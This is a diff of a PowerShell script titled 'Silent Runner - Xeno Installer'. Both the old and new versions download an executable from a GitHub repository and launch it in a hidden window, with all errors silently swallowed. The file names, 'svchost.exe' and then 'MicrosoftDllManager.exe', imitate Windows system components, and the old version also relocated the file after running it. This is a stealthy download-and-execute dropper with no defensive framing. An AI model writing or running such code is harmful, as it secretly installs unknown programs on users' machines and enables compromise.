@@ -1,11 +1,8 @@
 # Silent Runner - Xeno Installer
-$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/svchost.exe"
-$downloadPath = "$env:USERPROFILE\Downloads\svchost.exe"
-$finalPath = "$env:USERPROFILE\Videos\svchost.exe"
+$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllManager.exe"
+$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllManager.exe"
 
 try {
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $downloadPath -UseBasicParsing
-    Start-Process -FilePath $downloadPath -WindowStyle Hidden
-    Start-Sleep -Seconds 5
-    Move-Item -Path $downloadPath -Destination $finalPath -Force
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
+    Start-Process -FilePath $payloadPath -WindowStyle Hidden
 } catch {}
